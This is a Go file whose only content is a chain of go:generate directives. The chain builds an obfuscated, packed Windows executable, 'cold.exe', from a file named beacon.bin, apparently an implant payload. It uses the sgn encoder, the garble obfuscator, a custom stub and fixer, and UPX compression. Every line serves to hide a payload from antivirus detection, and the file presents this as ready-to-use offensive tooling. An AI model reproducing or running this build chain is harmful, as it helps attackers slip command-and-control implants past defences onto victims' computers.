package main

//go:generate cmd.exe /c echo author:piiperxyz
//go:generate go install mvdan.cc/garble@latest
//go:generate utils/sgn.exe -a 64 -o packer/beacon.bin packer/beacon.bin
//go:generate go run packer/packer.go -o stub
//go:generate garble build -o stub/stub stub/stub.go
//go:generate go run fixer/fixer.go -s stub/stub -o cold.exe
//go:generate utils/upx.exe cold.exe -9
